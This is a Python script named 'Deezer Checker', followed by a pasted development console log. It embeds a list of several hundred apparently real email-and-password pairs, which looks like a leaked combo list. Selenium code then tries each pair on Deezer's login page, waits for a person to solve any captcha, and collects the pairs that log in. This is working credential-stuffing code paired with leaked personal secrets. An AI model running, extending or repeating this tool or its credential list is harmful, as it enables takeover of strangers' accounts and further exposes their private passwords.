import pyperclip
import time
import selenium
from win10toast import ToastNotifier
from selenium import webdriver

dataset = [["chfiguer@gmail.com", "12tbtkws"], ["cccwam@gmail.com", "942714"], ["ronluna@gmail.com", "3089abcd"],
           ["iboulley@hotmail.com", "annee30"], ["bencarrier3@hotmail.com", "lafrite3"],
           ["barbarasantos1616@gmail.com", "babysantos"], ["nadege.lemperiere@free.fr", "somain59"],
           ["jasko.remi@gmail.com", "amidala"], ["pernet.jp@orange.fr", "depechemode"],
           ["mathy.loas@gmail.com", "Mathy.19"], ["ibuonafina@revistaenjoy.com", "Maas20023"],
           ["stutzmla@gmail.com", "cl270506"], ["streltsov1985@yandex.ru", "Moscow1147"],
           ["pourcel59@gmail.com", "rangev8efi"], ["morganne.r@hotmail.fr", "topaze"],
           ["ginoc.vandermeer@gmail.com", "James1986"], ["jonathan.slade1@gmail.com", "jazjazjaz"],
           ["crayapen@yahoo.com", "jAf2213eM1"], ["aciah@hotmail.com", "novembre"],
           ["gordon@cybermanor.com", "gvz1gvz"], ["eric.berthou@gmail.com", "thouber29"],
           ["christophe.stehlin@gmail.com", "keckispass"], ["angeline.louis@gmail.com", "imitek"],
           ["zpak69@yahoo.com", "fofapase"], ["ttoons35@yahoo.fr", "plasticroof351"], ["esely2@hotmail.fr", "llgllg"],
           ["debbieryder@hotmail.com", "Vickilee1"], ["jaysoncarlyle@gmail.com", "P@ssw0rd"],
           ["jacques-christine.millet@orange.fr", "minouche"], ["valsebmaz@hotmail.fr", "valerie"],
           ["sandrineseverin@orange.fr", "william"], ["ferozvahed@yahoo.com", "786gtigp"],
           ["lauravns@gmail.com", "lalala"], ["sandra190325@gmail.com", "paris1973"],
           ["thierry.mondon@neuf.fr", "a5cfxaff"], ["luca.toro@safar.it", "pineta35"],
           ["leticia.telesca@dhl.com", "pobox852"], ["valentine.bossy@free.fr", "v260486b"],
           ["skol51@hotmail.co.uk", "cruntfrace"], ["plepecheur@aol.com", "Folivore75"],
           ["gabrielle.jourdain@gmail.com", "espagne"], ["alanjmellor@gmail.com", "jilly2"],
           ["mamzellearmelle@orange.fr", "birmane"], ["jschellman@gmail.com", "wake22"],
           ["gwadagirl971-93@hotmail.fr", "ventesprivees"], ["geraldinepelletier@cegetel.net", "19760122"],
           ["erwan.letanneur@gmail.com", "xantia"], ["cynthiaze@yahoo.fr", "yesoui"],
           ["carole.massardier@live.fr", "carole10081988"], ["sophieberthe@gmail.com", "julie000"],
           ["v12293@msn.com", "gilligan"], ["jf.carer@gmail.com", "jfpatibelle"],
           ["jeremy.lengert@gmail.com", "lauriane01"], ["elianekh@orange.fr", "1voiture"],
           ["vladimirfortunenko@gmail.com", "9235393"], ["loreva.gel@wanadoo.fr", "costaud"],
           ["lammers.dana@gmail.com", "aqhdsb17"], ["kdemartini@hotmail.fr", "kimleeloo"],
           ["ben.molyneux@dbm-ltd.co.uk", "996turbos"], ["avanwegberg@gmail.com", "pOWER##1"],
           ["andreabrennand@hotmail.com", "051021"], ["l.allorio@tin.it", "mezzopunto"],
           ["jcrovas2@bigpond.com", "Jc272100"], ["dscott@hawaii.edu", "ss222kns"],
           ["claudeporterat@orange.fr", "vosges"], ["manouchka76@gmail.com", "balrog"],
           ["edouard.wentzy@orange.fr", "doudou"], ["clairemugnier@hotmail.fr", "pierre"],
           ["cat.mace@yahoo.fr", "vacances"], ["masbell@orange.fr", "63ussar81"],
           ["annievaz@rocketmail.com", "tx271956"], ["nicolas.moute@gmail.com", "marieh"],
           ["emilie.pagny@gmail.com", "ep040279"], ["doroteja.dvorzak@gmail.com", "dorka167"],
           ["aude.fourgous@gmail.com", "paca65"], ["seve.mariana@gmail.com", "fing1553er"],
           ["ribotdaphne@yahoo.fr", "coline"], ["olivierbloud@hotmail.com", "iconotec"],
           ["nathalietheze@hotmail.fr", "manevie21"], ["marioyefuga@gmail.com", "sphinx101"],
           ["lau.serge@yahoo.com", "diacom01"], ["aurelien.gehin@hotmail.fr", "zapallar"],
           ["salahzikri@yahoo.com", "srumrimo"], ["nicolas.zilmia@gmail.com", "sosososo"],
           ["naveenmurugan@gmail.com", "ndty198ndty"], ["rossbaird@hotmail.co.uk", "rino44"],
           ["ftersigni@rogers.com", "Frank1954"], ["didier@pmpub.fr", "leolou"],
           ["carsten.reinhold@t-online.de", "frosch"], ["ankb@bigpond.com", "uawsz123"],
           ["adel1902@hotmail.fr", "benoit72"], ["verobrandel@yahoo.fr", "bbmalibu"],
           ["tifennlaunay@yahoo.fr", "rolling"], ["reneehuntuk@gmail.com", "C3cahava"],
           ["raphael.lemoine87@gmail.com", "LWWi4z9i"], ["nathaliewiech@gmail.com", "bibi1964"],
           ["ludiaurore@hotmail.com", "ludi2611"], ["christinabecker007@gmail.com", "08tina09"],
           ["cheryltustain@yahoo.co.uk", "williams"], ["guthdesbois88@yahoo.fr", "261788"],
           ["jbakos@cse.sc.edu", "815bzxty"], ["jullu38@gmail.com", "chalet99"],
           ["sarah.naidji@hotmail.fr", "poliakov"], ["carla.m.k@hotmail.com", "chocolate"],
           ["roland@masmingou.com", "toulouse"], ["isabellemagdinier@hotmail.fr", "isabelle"],
           ["elodie.ngambi@hotmail.fr", "musique"], ["dekoo@breede.co.za", "lollipop"],
           ["christianebullain@hotmail.com", "123789456"], ["mkrikhely@gmail.com", "gabriel1"],
           ["kenzasabir.be@gmail.com", "juliette"], ["emy.brandner@gmail.com", "sunshine"],
           ["loiclemarchand@yahoo.fr", "catherine"], ["jean-maurice.cohidon@orange.fr", "loulou"],
           ["sarahhuxter@hotmail.co.uk", "number1"], ["oum1075@yahoo.fr", "loulou"],
           ["maellemeriot2@orange.fr", "carpediem"], ["celinepme@yahoo.fr", "nathalie"],
           ["catherinec2811@hotmail.com", "marshall"], ["ye.no@laposte.net", "winston"],
           ["tami2290@hotmail.com", "Stroodle22"], ["tnguyen@dtsoft.fr", "dtsoft75"],
           ["audrey.courreges@hotmail.fr", "poupee"], ["g.dupuis@sfr.fr", "24011979"],
           ["marc.fromager@wanadoo.fr", "clem0702"], ["nicolypert@orange.fr", "nisoflo1"],
           ["magellan4@aliceadsl.fr", "azerty9"], ["valerieplasmans@orange.fr", "noisette"],
           ["apagnon@Hotmail.com", "stephane"], ["audric.gueguen@gmail.com", "marseille"],
           ["rod14@me.com", "louise  rod1"], ["Gail.zammit@smbw.com.au", "charlotte1"],
           ["Florian.schneider67@laposte.net", "951753"], ["abrihana.botha@gmail.com", "a123456"],
           ["alohaaurely@hotmail.com", "juanito"], ["tina5tx@yahoo.co.uk", "pegasis5tx"],
           ["marta.sivric@yahoo.com", "1002988"], ["paul.genest@quadriom.com", "annie911"],
           ["ms.vijitchanton@gmail.com", "Hunter10"], ["menard.sophiemarie@gmail.com", "sophie16"],
           ["katiexanthis@hotmail.com", "manhattan82"], ["charlotte.covre@gmail.com", "141288"],
           ["veraashcar@uol.com.br", "teca00"], ["tony.fernandes@live.fr", "yufjhkoo"],
           ["t.syl2006@hotmail.fr", "emelda"], ["oaco.castrillon@gmail.com", "nthgthdgdcrtdtrk"],
           ["laets31@hotmail.fr", "laetitia3181"], ["francois.masfaraud@wanadoo.fr", "FM123547"],
           ["emma.tan@orange.fr", "emma1975"], ["chrisolir@free.fr", "irwing"],
           ["camille.kerherve@orange.fr", "camille35"], ["beatrice.vioulac@orange.fr", "1919AMmeda"],
           ["robayodoc@yahoo.com", "pacaguau"], ["bcoutinho@hotmail.co.uk", "bcoutinh0"],
           ["s.douay@yahoo.fr", "dune012"], ["karinepierre@ymail.com", "290700"], ["janou16@hotmail.com", "violaine"],
           ["decodantan@hotmail.com", "ramboo"], ["d.lemasson@orange.fr", "lemas002"],
           ["amandakate55@gmail.com", "Snickers21"], ["roger.arora@ymail.com", "hookem87"],
           ["marion.gondonneau@laposte.net", "mgmh7015"], ["catherineville@hotmail.com", "timeo06"],
           ["vincent.joly@worldonline.fr", "guenrouet"], ["janycausin@gmail.com", "cassandre14"],
           ["solaolojede@gmail.com", "sola9664"], ["mireille.meurger@wanadoo.fr", "NUMBER559"],
           ["mbigotm@gmail.com", "0610clara"], ["sainsard.elodie@orange.fr", "folisi1985"],
           ["jmbernard3@orange.fr", "djmbe777"], ["elodie.spica@gmail.com", "8576230016"],
           ["jennyfiona8@orange.fr", "fiona8"], ["daniele.lombard@gmail.com", "jackmin"],
           ["mcarboni@laposte.net", "skal07"], ["fred.rose0572@gmail.com", "Dianor10"],
           ["faconte075@sfr.fr", "maison71"], ["saraalnusif@me.com", "swn1049"],
           ["mcqueen.campbell@gmail.com", "rolex9524"], ["lequementg@gmail.com", "mid784"],
           ["laurentmarigault@hotmail.fr", "Kicalo60"], ["joanna.sinet@gmail.com", "pommeus3"],
           ["farhan.k33@gmail.com", "fak312a"], ["chelgerosa@gmail.com", "gerosa"], ["annelst85@gmail.com", "nala85"],
           ["thibault.roxane@gmail.com", "roxititi"], ["laure2305@hotmail.com", "calogero"],
           ["fjv006@gmail.com", "kilroy123"], ["jeancostes@gmail.com", "Ecrins2000"],
           ["rodger8888@gmail.com", "rodpass"], ["michelle.prot@hotmail.fr", "romane"],
           ["mayrargue@hotmail.com", "anouar"], ["marionsav@gmail.com", "ionion"],
           ["matthew.stubbs@hotmail.co.uk", "mps310192"], ["grein.sebastian@gmx.de", "barrel"],
           ["felipealls@gmail.com", "96035789"], ["chombor@gmail.com", "747576"], ["a.wejrzanowska@op.pl", "annaWK30"],
           ["wenn.f@wanadoo.fr", "geode1"], ["melissa.poelstra@gmail.com", "litlit71"],
           ["lacane@yahoo.fr", "eulalie12"], ["fwalker507@hotmail.com", "220765"],
           ["moujahid.sofia@gmail.com", "2h10607"], ["almir.moreira@gmail.com", "zik81033"],
           ["jjs.sigrist@orange.fr", "ARGENT77"], ["emmafreget@hotmail.com", "boubou30"],
           ["barbaraurruspil@hotmail.com", "220489"], ["hickman.neil@gmail.com", "marg2611"],
           ["caroline1.faivre@gmail.com", "83351234"], ["annadecherit@hotmail.fr", "090804lou"],
           ["tlipenko@yandex.ru", "Barsik1973"], ["smaranda.rdt@gmail.com", "rock2612"],
           ["mguillot@boogie-design.net", "volvop1800"], ["kirsten.amen@web.de", "kiki2210"],
           ["levy.eric@gmail.com", "09770977"], ["kellydebique@hotmail.com", "11891189"],
           ["josselindubet@hotmail.com", "rayban1966"], ["griffindor17@yahoo.fr", "sybelle"],
           ["fredysed@gmail.com", "maelfred"], ["francoise38@wanadoo.fr", "dieulafait"],
           ["ramonastoica2004@yahoo.com", "arbore05"], ["laurence.joverorjol@gmail.com", "numanuma"],
           ["pcorberes@gmail.com", "chanoune"], ["eshurtt@aol.com", "esh0626"],
           ["dennis@iwillfinanceyou.com", "dale3333"], ["natcohen510@gmail.com", "Na4970t6"],
           ["michele.ks@orange.fr", "Mikaella1 "], ["melanie.biasi@hotmail.fr", "mbia2311"],
           ["doxx55@hotmail.com", "xxod3001"], ["ramtoulaye@gmail.com", "Elizabeth_3"],
           ["letm35@orange.fr", "ollule13  letm3"], ["jmezacook@yahoo.com", "madsam88"],
           ["caasy2009@hotmail.com", "mofo9090"], ["schmitpi@orange.fr", "extrem"],
           ["rfk.belaid@gmail.com", "zakouski"], ["raphael.brosseau@gmail.com", "73raph77"],
           ["marie.azango@hotmail.fr", "60719BRU"], ["n.decreau@gmail.com", "elysadec"],
           ["lenimerat@yahoo.fr", "roland28"], ["melimelokid@numericable.fr", "carreira"],
           ["n.petrovic@wanadoo.fr", "pati09"], ["laurencebastien@hotmail.fr", "boursier"],
           ["leleu.family@orange.fr", "bulldozer"], ["jonahpet@yahoo.com", "sawedd"],
           ["benoit.d6@orange.fr", "benfish"], ["nanelor@ymail.com", "jumeaux2"], ["marsha.gay@gmail.com", "luvlavie"],
           ["helene.danielou@sfr.fr", "jhtales4d"], ["eric.nitard@orange.fr", "canoures1"],
           ["fruchtfliegengod@gmx.de", "murkel"], ["giovannetti.marie-claire@wanadoo.fr", "pitchie"],
           ["rob@steckbeck.org", "Nw6kes"], ["peggybourgeais@hotmail.com", "16071977"],
           ["kemistrypops@gmail.com", "kemistry1"], ["carlos.leigh.h@gmail.com", "cleigh0411"],
           ["mimi-s82@hotmail.fr", "lhistoire"], ["maxim.lyalin@gmail.com", "aw3edcft6"],
           ["klaik@hotmail.fr", "dorothee"], ["nohemifacchin@hotmail.com", "piccolina86"],
           ["qwas373@hotmail.com", "mft999"], ["dinckytwist@yahoo.fr", "vinceB"], ["dorochas@hotmail.fr", "domie369"],
           ["heleneetteddy@hotmail.fr", "martov07"], ["laurene.nogues@gmail.com", "aldovenus"],
           ["mariebral@hotmail.fr", "120177"], ["sroux95@gmail.com", "51715171"],
           ["marcbonischarancle@gmail.com", "adth1459"], ["stellavalton@gmail.com", "05092009"],
           ["tonio1ritaldu91@hotmail.fr", "tonio91"], ["claude.trouessard@wanadoo.fr", "thais135"],
           ["distinct38@hotmail.fr", "690007"], ["jolman.ramirezb@gmail.com", "Jolman2013"],
           ["djaiph@gmail.com", "vfacyzw!"], ["susalan@hotmail.com", "akasus"], ["sykslyne@hotmail.com", "vert12"],
           ["pedja.stanojevic@gmail.com", "pigeon80"], ["berengere.simon@icloud.com", "gebela"],
           ["thelas1@hotmail.com", "Active85"], ["jameshiggins37@hotmail.co.uk", "Nimbus01"],
           ["berda@wanadoo.fr", "jereyoan"], ["barbouche.marie@orange.fr", "jeannot"],
           ["taltoan1211@gmail.com", "psalms55"], ["stef.lgl@me.com", "happyday"], ["nmutel@hotmail.com", "voyages"],
           ["mmgomess@gmail.com", "jm553400"], ["miamiobdoc@mac.com", "esrhunt1"],
           ["laurencetkatco@gmail.com", "biarritz"], ["holliejay54@gmail.com", "isaac1dil  Holli"],
           ["eric.vion@gmail.com", "lnbdry0311"], ["daniellebrockway@hotmail.com", "lynn1982"],
           ["darrenleehughes@aol.com", "daz123"], ["ynouvel@gmail.com", "080181"],
           ["rousseausarah7249@hotmail.fr", "police"], ["sail4real@yahoo.com", "sangre101"],
           ["remi.duboille@orange.fr", "Antoine95"], ["nicolas.delrieu@yahoo.fr", "a5vcnkvm"],
           ["lechouille@gmail.com", "pageau123"], ["jygarel@gmail.com", "8t2ufht5"],
           ["catherinemcdonnell1@hotmail.com", "Teddy123"], ["archeo17@aol.com", "eliott27"],
           ["vere.carvalho@gmail.com", "260475"], ["stephane.mazzolini@wanadoo.fr", "mazzo69"],
           ["fysy@orange.fr", "immuno"], ["boukledor@gmail.com", "gamine"], ["aludivine@msn.com", "1bjefjsn"],
           ["zpheza@gmail.com", "mcebisi1"], ["tamara86@gmail.com", "komedija"],
           ["robpritchard@talk21.com", "Derby1234"], ["siphiwe@meluleki.co.za", "abag260"],
           ["tonton98@hotmail.com", "kassoumai"], ["derachemaryse@free.fr", "dieguito"],
           ["chbanks@bigpond.net.au", "georgia14"], ["annabelleabrand@hotmail.com", "anna1419"],
           ["adolfofiori@hotmail.com", "atavulata"], ["mireille.domblides@wanadoo.fr", "ourselune"],
           ["maevae@gmail.com", "moorea82"], ["kucuk@orange.fr", "kucuk3103"],
           ["laeti310584@hotmail.com", "beausoleil"], ["jbresnan@gmail.com", "23yellow"],
           ["isabelle.schoirfer@orange.fr", "isalabel88"], ["cdhuet@free.fr", "emalisa"],
           ["barryemmerton@gmail.com", "M4gicw4nd"], ["tom@turmezei.com", "Wingman1"],
           ["ryan@nickwestdev.com", "brodiedh"], ["savary.florence@gmail.com", "flo_2808"],
           ["omeragic.una@gmail.com", "amarcord5"], ["fleurine.b@hotmail.fr", "foxaklak"],
           ["ekafraley2002@yahoo.com", "abigail27"], ["daurelleca@orange.fr", "cvbn12"],
           ["christian.leggio325@orange.fr", "christian41"], ["chezsof@hotmail.com", "olympique"],
           ["sophiebeslay@gmail.com", "himalaya"], ["kenji87luna32@hotmail.com", "kenji87"],
           ["georgetti.stefano@gmail.com", "f9wada3r"], ["gcofino@hotmail.com", "bland2803"],
           ["stvnbirrell@aol.com", "630101"], ["flor64@hotmail.fr", "010869"], ["dfaf73@gmail.com", "wriggle1"],
           ["brad7656@hotmail.com", "Hamlet11"], ["alisonm1967@hotmail.co.uk", "redcomet16  aliso"],
           ["nabaju42@yahoo.fr", "120168"], ["nishant.s.patel@gmail.com", "scatman"],
           ["maeva.brouchos@wanadoo.fr", "soldad30"], ["leahcunliffe@googlemail.com", "250392ljc"],
           ["darry@yahoo.com", "123lawica"], ["taliamiranda@gmail.com", "tali1210"],
           ["sabrina.dufay@gmail.com", "Texasjoke"], ["pierre.lagarde2@gmail.com", "LpoHoaYju63"],
           ["milie2506@hotmail.fr", "DENTAIRE"], ["isaphane@club-internet.fr", "titigre"],
           ["despresfabrice@gmail.com", "frodon99"], ["charles.rgr@gmail.com", "g69istil"],
           ["stephplr@wanadoo.fr", "lauriane"], ["reges96@hotmail.com", "euregesmd"],
           ["mimastockebrand@gmail.com", "obrenovac"], ["lilianaaya@gmail.com", "sagitario1"],
           ["isabelle.leo@hotmail.fr", "soleil14"], ["carine.poletti@wanadoo.fr", "bbeach66"],
           ["donkervoort7@gmail.com", "cartersj"], ["audreyrioland@gmail.com", "carlalili"],
           ["sandrajandre@hotmail.com", "sandra77"], ["moroo83@gmail.com", "spilunghina"],
           ["gigamakina@hotmail.com", "dodo8586"], ["bitterbleu@hotmail.com", "iloveg"],
           ["walterfranck@neuf.fr", "francki007"], ["vbmfamille@gmail.com", "adonisfitness"],
           ["slimso1@hotmail.com", "tartuffe"], ["guillaume.bourgey@wanadoo.fr", "30072005"],
           ["dsjeon@gmail.com", "1fidduty"], ["charlotte.cabanne@hotmail.fr", "botrytis"],
           ["tomraw@hotmail.com", "rose3693p"], ["evelynzarola@hotmail.com", "pacifique"],
           ["droualflorian@msn.com", "636u2xys"], ["cuderoveronique@aol.com", "candeleda"],
           ["yasmin.operti@gmail.com", "yasmin1990"], ["jcecile2@yahoo.fr", "mouflonne"],
           ["munro1145@gmail.com", "Joshmoore"], ["barbier.celine@neuf.fr", "frontonas"],
           ["emmanuelle0123@hotmail.com", "candie"], ["djecelie@hotmail.com", "070783"],
           ["benechagnard@yahoo.fr", "flober"], ["bezinverena@gmail.com", "v1r2b3x4"], ["yannabonamy@me.com", "170985"],
           ["veronique.auger22@orange.fr", "grenois58"], ["ph.grandjean@free.fr", "filou44"],
           ["jllasseri@marvellavocats.com", "tzhougem  Jea"], ["jerseysev@yahoo.fr", "sevlem78"],
           ["emilieroubaud@laposte.net", "milpat13"], ["emeline.decouvelaere@club-internet.fr", "te091004"],
           ["csubbiondo@wschav.net", "Maddyd11"], ["celine.debard@wanadoo.fr", "malolison"],
           ["wendygrobb@gmail.com", "baby2013"], ["thesuddes@virginmedia.com", "Conrad01"],
           ["rizzyk@gmail.com", "Asian5539"], ["looletludi@wanadoo.fr", "fistoulic"],
           ["joss28.bernard@gmail.com", "jopoliakis"], ["marciarj03@yahoo.com.br", "720428"],
           ["davieewan@googlemail.com", "1cornmill  Davieewa"], ["jmaleyz@hotmail.com", "jm6033"],
           ["miluce@chambreslethex.com", "lethex"], ["nath.perlin@gmail.com", "bellevue"],
           ["symonielindsay@gmail.com", "7301370sl"], ["florence.gilloury@free.fr", "oceans94"],
           ["rebouh.dalila@orange.fr", "yanis002 "], ["seblola@orange.fr", "lola0209"],
           ["slrmcm@wanadoo.fr", "20041005  mari"], ["tinemar.p@gmail.com", "havane97"],
           ["noelleharmand@orange.fr", "lucie1"], ["laurine-r@live.fr", "lpmt13"],
           ["mardiejennings@hotmail.com", "dannyj76"], ["amandine.poret@gmail.com", "cubanita94"],
           ["annabelle.fenelon@gmail.com", "fraise45"], ["benja0711@hotmail.fr", "071180"],
           ["s.bouton0@laposte.net", "memere88"], ["rossi.frederic@neuf.fr", "flo337800"],
           ["julietmmurray@btinternet.com", "bradley10"], ["joel.javelaud@neuf.fr", "virgule2"],
           ["jennifer@innerhealth.co.za", "field131"], ["guillaume@plisson.com", "24363108"],
           ["quentin.loccoz@gmail.com", "marikita "], ["r4church@gmail.com", "jen4rich"],
           ["pomchaleat@wanadoo.fr", "160265"], ["peterjparmentier@gmail.com", "malvies"],
           ["dorogaeremynck@gmail.com", "goundi02"], ["bettyboop2106@live.fr", "betty2109"],
           ["audlouvat@gmail.com", "sensinterdit"], ["olivier.guggenbuhl@orange.fr", "oggg2806"],
           ["alexandre.fortune@gmail.com", "uhcgzy6"], ["marylinepapouin@yahoo.fr", "varende"],
           ["ivanmarkov@live.com", "ika110482"], ["floredelacroix846@hotmail.com", "Flore846"],
           ["thierryhecquet@hotmail.com", "vietnam1"], ["marion.richeux@gmail.com", "ionmar"],
           ["lucie2908@orange.fr", "brec13"], ["lilianns@gmail.com", "plamsv"], ["kriskaro@wanadoo.fr", "loulou16"],
           ["ged.deb@btinternet.com", "measles  ged.de"], ["diana.sondermann@hotmail.de", "Irland06"],
           ["vivat.lucile@hotmail.fr", "220389"], ["terry@terrydclark.ca", "bobbyorr4"],
           ["skinnyboutique@rogers.com", "12345suzy"], ["moulin.fred1@gmail.com", "Frederic123@*"],
           ["gustavoprestini@hotmail.com", "152749"], ["josericardoponte@uol.com.br", "jr551588"],
           ["claire.audebert@club-internet.fr", "kerty1"], ["heroine.falbala@hotmail.fr", "bene1408"],
           ["jc.pourrier@sfr.fr", "Marine02"], ["pauline.reffay@orange.fr", "cerise38"],
           ["dutourseverine@gmail.com", "loulou40"], ["kakodazin@hotmail.fr", "pradel"],
           ["jeromaga@wanadoo.fr", "doudou1904"], ["audrezet.serge@orange.fr", "1000sabords"],
           ["wiklund.jessica@gmail.com", "esther87"], ["lyladelyloo@yahoo.fr", "lou1310"],
           ["juan.alarcon@hotmail.fr", "coursan11"], ["jlacroix110263@rogers.com", "brooke1025"],
           ["crafthomes@comcast.net", "wunderlust"], ["chabine@wanadoo.fr", "elsa83"],
           ["thc.leandro@gmail.com", "L34ndr0"], ["sebma49@msn.com", "digoo54"], ["gwla5@hotmail.fr", "gwla10"],
           ["devonhealth@aol.com", "dtr080649"], ["daleendup1@gmail.com", "levilucy"],
           ["leze.charline@hotmail.fr", "lalande"], ["livia.filote@yahoo.com", "fatadebideu"],
           ["michellertn@hotmail.fr", "penelope"], ["nicolaslhostis@gmail.com", "porsguen"],
           ["sanchez-sandra@orange.fr", "sandra19"], ["stephane.angoujart@orange.fr", "lounge16"],
           ["vermersch.gilles@orange.fr", "LEACARLA2419"], ["annelebon8@gmail.com", "aurevoir"],
           ["campbell.richard@icloud.com", "bme2hmck"], ["evelyne.godulla@free.fr", "God426400"],
           ["maisonial.marina@hotmail.fr", "tascam"], ["sarah.marciano@hotmail.fr", "Phenix31"],
           ["contact@qbis.fr", "milasoma"], ["elisanied@hotmail.com", "morgan2306"], ["hermzer@yahoo.com", "migadde"],
           ["cmhoche@hotmail.com", "chandolas"], ["iyavioletta@hotmail.com", "yayano"],
           ["yves.gaudel@humanis.com", "240464"], ["michtala@orange.fr", "323000"],
           ["iwan.streichenberger@yahoo.com", "i170174s"], ["camille.dufau@gmail.com", "231287"],
           ["vdarcet@hotmail.fr", "vivilaouf"], ["olivier.colmant@wanadoo.fr", "oc5536vb"],
           ["marie.lebourg@gmail.com", "lune24"], ["juliana.bonelli@wanadoo.fr", "ajaccio"],
           ["jclpinatel@orange.fr", "jecalo"], ["perraudma@wanadoo.fr", "loulous210905"],
           ["lougrat.cedric@orange.fr", "731327"], ["hdeperignon@hotmail.com", "nongirep"],
           ["russool@yahoo.com", "jkc786"], ["ophelie.pecantet@gmail.com", "bouty4465"],
           ["miss.terre13@yahoo.fr", "tchouk"], ["marceloafontes@gmail.com", "fam001"],
           ["aneesha.rai@gmail.com", "roughwork"], ["mathilde.dfs@gmail.com", "lolipop2812"],
           ["domi0706@hotmail.fr", "tututtedo"], ["thdruzko@yahoo.com", "wild1717!"],
           ["sk-produkte@gmx.de", "Apollo27"], ["morganbassant@gmail.com", "ilswd87"],
           ["domagojpecek@gmail.com", "hunk880 "], ["amaulny@live.fr", "amam01"], ["sohamdjouri@hotmail.fr", "sohame"],
           ["olga.redfox@gmail.com", "q0940644"], ["m-j.damm@gmx.de", "16052411"], ["kcabr@yahoo.com", "857868"],
           ["gwenaelle.quemener@gmail.com", "429688"], ["christian.thurau@hotmail.de", "0173hansherbert"],
           ["jejelevis@yahoo.fr", "0112jeje"], ["christelebonningues@hotmail.com", "14072005"],
           ["lauvemi@yahoo.fr", "170180"], ["carlsen.jill@gmail.com", "08122006C"], ["erikvachon@yahoo.com", "phisher"],
           ["karickepiek@gmail.com", "Anrich21"], ["marie.depinois@gmail.com", "Eq38KdMy"],
           ["lesmadeleinesvertes@orange.fr", "choisel1"], ["fmichot@msn.com", "olive2311"],
           ["ankhnas@gmail.com", "Farouk12"], ["anave1@hotmail.com", "kouta43"],
           ["virginie.weisz@gmail.com", "capucine"], ["stephanie.morille615@orange.fr", "19701972"],
           ["evecarne@orange.fr", "pierrejuju"], ["erin@erinsanderdesign.com", "grace915"],
           ["skinner.amber@gmail.com", "youngae"], ["reyaazh@gmail.com", "hembem23"],
           ["lucileguillaume@yahoo.fr", "nounou4*"], ["claire.cleenewerck@wanadoo.fr", "alidas07"],
           ["v.dilbert@yahoo.com", "Billy1982"], ["ukolovroman@yandex.ru", "ukolov180981"],
           ["rgbills@mcintyrebills.com", "46464646"], ["nahissat@hotmail.com", "meknes"],
           ["tejvghj@gmail.com", "kar000"], ["mazazou@gmail.com", "malou1948"],
           ["virginiebreau@gmail.com", "lafripouille"], ["chbechu@yahoo.fr", "lupuss"],
           ["celinepechmajou@hotmail.com", "pech24"], ["fletcher.pa@mac.com", "26aout71"],
           ["sophdekk@hotmail.com", "scuba1"], ["ivan.marli@gmail.com", "Bakaceva5"],
           ["marion.boute@gmail.com", "kentou"], ["sophieguegan@yahoo.fr", "louis082010"],
           ["carine.charpentier@wanadoo.fr", "carine"], ["hervevermesch@me.com", "roquette6"],
           ["jeromemathieu450@neuf.fr", "changer1"], ["marie-annick.chesneau@orange.fr", "maubelan38"],
           ["jkvacala@yahoo.com", "kvakino27"], ["renatablas@gmail.com", "shocker55"]]
while False:
    for data in dataset:
        print("the email is:", data[0], "and the password is:", data[1])
        pyperclip.copy(data[0])
        time.sleep(0.5)
        pyperclip.copy(data[1])
        input("press enter to continue")
    print("you reached the end, press enter to try again: ")


class Deezer:
    def __init__(self):
        self.browser = webdriver.Chrome(executable_path="chromedriver.exe")
        self.option = selenium.webdriver.chrome.options.Options()
        self.option.add_argument("--incognito")
        self.browser.get("https://www.deezer.com/en/login")

    def close(self):
        self.browser.close()

    def type_user_pass(self, username, password):
        self.browser.find_elements_by_class_name("unlogged-input")[0].send_keys(username)
        self.browser.find_elements_by_class_name("unlogged-input")[1].send_keys(password)

    def log_in(self):
        self.browser.find_elements_by_class_name("unlogged-btn-label")[4].click()
        # self.browser.switch_to

    def check_captcha_exist(self):
        return len(
            self.browser.find_elements_by_tag_name("iframe")[2].get_attribute("style").split("width: 100%;")) <= 1

positive = []
dz = Deezer()
for data in dataset:
    dz.type_user_pass(data[0], data[1])
    dz.log_in()
    time.sleep(3.8)
    if dz.check_captcha_exist():
        toast= ToastNotifier()
        toast.show_toast("Please bypass the captcha")
        input("Please bypass the captcha:")
    elif dz.browser.current_url == "https://www.deezer.com/en":
        print("The username is:",data[0])
        print("The password is:",data[1])
        positive.append(data)


"""
"C:\\Users\Yassine\PycharmProjects\Deezer Checker\\venv\Scripts\python.exe" "E:\programmes\JetBrains\PyCharm Community Edition 2019.3.3\plugins\python-ce\helpers\pydev\pydevconsole.py" --mode=client --port=3587
import sys; print('Python %s on %s' % (sys.version, sys.platform))
sys.path.extend(['C:\\Users\\Yassine\\PycharmProjects\\Deezer Checker', 'C:/Users/Yassine/PycharmProjects/Deezer Checker'])
PyDev console: starting.
Python 3.6.3 (v3.6.3:2c5fed8, Oct  3 2017, 17:26:49) [MSC v.1900 32 bit (Intel)] on win32
runfile('C:/Users/Yassine/PycharmProjects/Deezer Checker/main.py', wdir='C:/Users/Yassine/PycharmProjects/Deezer Checker')
import selenium
option = selenium.webdriver.chrome.options
browser.close()
option = selenium.webdriver.chrome.options.Options()
option.add_argument("--incognito")
from ctypes.macholib.dyld import dyld_executable_path_search
... 
... browser = selenium.webdriver.Chrome(executable_path="chromedriver.exe")
browser.get("https://www.deezer.com/en/login")
browser.find_element_by_class_name("unlogged-input")
<selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="4c854780-be39-4384-8f4e-4a4a54fbdb96")>
browser.find_elements_by_class_name("unlogged-input")
[<selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="4c854780-be39-4384-8f4e-4a4a54fbdb96")>, <selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="b5023289-2938-480e-a5aa-0254890083f7")>]
browser.find_elements_by_class_name("unlogged-input").length
Traceback (most recent call last):
  File "<input>", line 1, in <module>
AttributeError: 'list' object has no attribute 'length'
len(browser.find_elements_by_class_name("unlogged-input"))
2
browser.find_elements_by_class_name("unlogged-input")[0].send_keys('heeey')
browser.find_elements_by_class_name("unlogged-input")[1].send_keys('hesdfdeey')
browser.find_elements_by_class_name("unlogged-btn-label")
